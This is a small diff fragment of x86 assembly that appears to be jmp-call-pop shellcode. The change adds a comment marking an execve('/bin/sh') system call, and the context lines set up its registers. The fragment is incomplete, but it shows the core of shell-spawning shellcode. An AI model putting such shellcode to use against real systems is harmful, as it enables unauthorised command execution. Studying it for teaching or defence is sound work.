@@ -20,6 +20,7 @@ _start:
 	jmp short two
 
 one:
+    ; execve('/bin/sh', 0, 0)
 	pop ebx
 	mov al, 0x0b
 	xor ecx, ecx
